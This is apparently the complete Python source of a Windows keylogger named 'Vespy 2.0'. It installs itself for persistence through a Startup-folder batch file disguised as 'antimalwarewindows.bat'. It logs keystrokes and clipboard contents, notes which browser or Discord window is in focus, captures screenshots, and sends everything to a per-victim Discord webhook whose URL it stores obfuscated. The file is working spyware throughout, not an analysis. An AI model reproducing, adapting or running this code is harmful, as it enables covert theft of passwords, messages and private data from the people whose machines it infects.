import os, codecs, sys
from getpass import getuser;user=getuser()
from discord import Client, Intents
from win32gui import GetForegroundWindow, GetWindowText
from base64 import b64encode, b64decode
from discord_webhook import DiscordWebhook, DiscordEmbed
from pynput.keyboard import Key as letz, Listener
from PIL import ImageGrab
from random import randint
from pyperclip import paste
VROODS = ["googlechrome","microsoft edge","opera","brave","discord","steam","epic","mozillafirefox"]
V3_5P3R_______AHH__H8V555=[];C__ONT667=0;S1T3_P4TH = f"C:\\Users\\{user}\\AppData\\Local\\Temp\\k888eys000.meow";wbh=""
class Startup:

        def __init__(self):
            self.file = sys.argv[0]
            ext = self.file.split("\\")[-1].split(".")[-1]
            name = self.file.split("\\")[-1].split(".")[0]
            self._startup(ext,name)

        def _startup(self,e,n):
            try:
                if os.path.exists(f'C:\\Users\\{user}\\AppData\\Local\\Temp\\{n}.{e}'):
                    if os.path.exists(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\antimalwarewindows.bat"):
                        pass
                    else:
                        open(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\antimalwarewindows.bat","w+").write(fr"""start C:\\Users\\{user}\\AppData\\Local\\Temp\\{n}.{e}""")
                else:
                    with open(f'C:\\Users\\{user}\\AppData\\Local\\Temp\\{n}.{e}', 'wb') as f:
                        f.write(open(self.file, 'rb').read())
                    open(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\antimalwarewindows.bat","w+").write(fr"""start C:\\Users\\{user}\\AppData\\Local\\Temp\\{n}.{e}""")
            except:pass
Startup()
class S1T3:
        def __init__(self):
            self.current_title = self.__g3tw1nd0w__()
        def __g3tw1nd0w__(self):
            hwnd = GetForegroundWindow()
            return GetWindowText(hwnd)
        def __repr__(self):
            return self.current_title
open(S1T3_P4TH,'wb').write(str(S1T3()).encode())
class kylg0r:
        def __init__(self,V4R_N4D4______):
            global wbh
            try:
                self.wbh = wbh.url
            except:
                self.wbh = wbh
            global V3_5P3R_______AHH__H8V555, C__ONT667
            self.V3_5P3R_______AHH__H8V555 = V3_5P3R_______AHH__H8V555
            self.CURR_S1tE = str(open(S1T3_P4TH,'rb').read().decode())
            F6LL_S1T3 = str(S1T3())
            S1TE = str(S1T3()).split("-")[-1].strip().lower().replace(" ","")
            if str(self.CURR_S1tE) == F6LL_S1T3:
                pass
            else:
                if S1TE in tuple(VROODS):
                    if len(self.V3_5P3R_______AHH__H8V555) > 10:
                        str4ng = 0
                        for l3tt3rs in self.V3_5P3R_______AHH__H8V555:
                            if l3tt3rs == "w":str4ng+=1
                            if l3tt3rs == "a":str4ng+=1
                            if l3tt3rs == "s":str4ng+=1
                            if l3tt3rs == "d":str4ng+=1
                            if l3tt3rs == ' ':str4ng+=1
                            if l3tt3rs == '|ctrl|':str4ng+=1
                        if str4ng == len(self.V3_5P3R_______AHH__H8V555):
                            C__ONT667 =0
                            V3_5P3R_______AHH__H8V555=[]
                    else:
                        if len(self.V3_5P3R_______AHH__H8V555) > 25:
                            self.sendpic()
                            self.sendletz()
                            V3_5P3R_______AHH__H8V555 = []
                            C__ONT667=0
                        else:
                            self.CURR_S1tE = F6LL_S1T3
                            self.V3_5P3R_______AHH__H8V555.append(f" ---> {self.CURR_S1tE}\n\n")
                        self.CURR_S1tE = F6LL_S1T3
                        open(S1T3_P4TH,'wb').write(str(self.CURR_S1tE).encode())
            if V4R_N4D4______ == letz.space:
                V4R_N4D4______ = ' '
            elif V4R_N4D4______ == letz.backspace:
                V4R_N4D4______ = ' |<-| '
            elif V4R_N4D4______ == letz.shift or V4R_N4D4______ == letz.shift_l or V4R_N4D4______ == letz.shift_r:
                V4R_N4D4______ = ''
            elif V4R_N4D4______ == letz.ctrl or V4R_N4D4______ == letz.ctrl_l or V4R_N4D4______ == letz.ctrl_r:
                V4R_N4D4______ = ' |ctrl| '
            elif V4R_N4D4______ == letz.alt or V4R_N4D4______ == letz.alt_l or V4R_N4D4______ == letz.alt_r:
                V4R_N4D4______ = ' |alt| '
            elif V4R_N4D4______ == letz.alt_gr:
                V4R_N4D4______ = ' |alt_gr| '
            elif V4R_N4D4______ == letz.tab:
                V4R_N4D4______ = ' |tab| '
            elif V4R_N4D4______ == letz.esc:
                V4R_N4D4______ = ' |esc| '
            elif V4R_N4D4______ == letz.caps_lock:
                V4R_N4D4______ = ''
            elif V4R_N4D4______ == letz.cmd or V4R_N4D4______ == letz.cmd_l or V4R_N4D4______ == letz.cmd_r:
                V4R_N4D4______ = ' |cmd| '
            elif V4R_N4D4______ == letz.delete:
                V4R_N4D4______ =  ' |delete| '
            elif V4R_N4D4______ == letz.end:
                V4R_N4D4______ = ' |end| '
            elif V4R_N4D4______ == letz.home:
                V4R_N4D4______ = ' |home| '
            elif V4R_N4D4______ == letz.insert:
                V4R_N4D4______ = ' |insert| '
            elif r"\x16" in str(V4R_N4D4______):
                V4R_N4D4______ = str(paste())
            elif r"\x03" in str(V4R_N4D4______):
                V4R_N4D4______ = ''
            elif r"\x01" in str(V4R_N4D4______):
                V4R_N4D4______ = ''
            elif r"\x13" in str(V4R_N4D4______):
                V4R_N4D4______ = ''
            elif C__ONT667 >= 150:
                self.sendpic()
                self.sendletz()
                C__ONT667=0
                V3_5P3R_______AHH__H8V555 = []
            elif V4R_N4D4______ == letz.enter:
                if S1TE == 'discord':
                    if len(self.V3_5P3R_______AHH__H8V555) < 25:
                        V4R_N4D4______ = ' |enter| '
                    else:
                        V4R_N4D4______ = ' |enter| '
                        self.V3_5P3R_______AHH__H8V555.append(str(V4R_N4D4______))
                        self.sendpic()
                        self.sendletz()
                        V3_5P3R_______AHH__H8V555 = []
                        C__ONT667=0
                else:
                    if len(self.V3_5P3R_______AHH__H8V555) < 10:
                        V4R_N4D4______ = ' |enter| '
                    else:
                        V4R_N4D4______ = ' |enter| '
                        self.V3_5P3R_______AHH__H8V555.append(str(V4R_N4D4______))
                        self.sendpic()
                        self.sendletz()
                        V3_5P3R_______AHH__H8V555 = []
                        C__ONT667=0
            else:
                try:
                    V4R_N4D4______=str(V4R_N4D4______).split('"')[1].split('"')[0]
                except:
                    try:
                        V4R_N4D4______=str(V4R_N4D4______).split("'")[1].split("'")[0]
                    except:
                        pass
            if len(self.V3_5P3R_______AHH__H8V555) > 10:
                str4ng = 0
                for l3tt3rs in self.V3_5P3R_______AHH__H8V555:
                    if l3tt3rs == "w":str4ng+=1
                    if l3tt3rs == "a":str4ng+=1
                    if l3tt3rs == "s":str4ng+=1
                    if l3tt3rs == "d":str4ng+=1
                    if l3tt3rs == ' ':str4ng+=1
                    if l3tt3rs == '|ctrl|':str4ng+=1
                if str4ng == len(self.V3_5P3R_______AHH__H8V555):
                    C__ONT667 =0
                    V3_5P3R_______AHH__H8V555=[]
            if str(V4R_N4D4______) == "Key.up" or str(V4R_N4D4______) == "Key.left" or str(V4R_N4D4______) == "Key.down" or str(V4R_N4D4______) == "Key.right":
                pass
            else:
                self.V3_5P3R_______AHH__H8V555.append(str(V4R_N4D4______))
                C__ONT667 += 1
        def sendpic(self):
            screeny = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
            screeny.save("testyy.jpg")
            screeny.close()
            webhook = DiscordWebhook(url=self.wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
            with open('testyy.jpg', 'rb') as f:
                webhook.add_file(file=f.read(), filename='testy.jpg')
            webhook.execute()
            os.remove('testyy.jpg')
        def sendletz(self):
            LTTRS = ""
            for letz in self.V3_5P3R_______AHH__H8V555:
                LTTRS += f"{letz}"
            webhook = DiscordWebhook(url=self.wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
            embed = DiscordEmbed(title=f"User : ``{user}``", description=f"Keys Captured : \n```{LTTRS}```\nCurrent Site : **{self.CURR_S1tE}**", color='4300d1')
            embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
            embed.set_timestamp()
            webhook.add_embed(embed)
            webhook.execute()
            self.V3_5P3R_______AHH__H8V555 = []
bota = Client(intents=Intents.all())
@bota.event
async def on_ready():
        global wbh
        if os.path.exists(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\omg777omg555omg111.meow"):
            wbh = open(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\omg777omg555omg111.meow","rb").read()
            wbh = codecs.decode(b64decode(codecs.decode(wbh.decode(),"rot13")).decode(),"rot13")
            with Listener(on_press=kylg0r) as listner:
                listner.join()
        else:
            newchannel = await bota.guilds[0].create_text_channel(f"{user}-{randint(100,999)}")
            wbh = await newchannel.create_webhook(name='hit-wbh')
            poop = codecs.encode(b64encode(codecs.encode(str(wbh.url),"rot13").encode()).decode(),"rot13").encode()
            open(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\omg777omg555omg111.meow","wb").write(poop)
            with Listener(on_press=kylg0r) as listner:
                listner.join()
                
bota.run("")

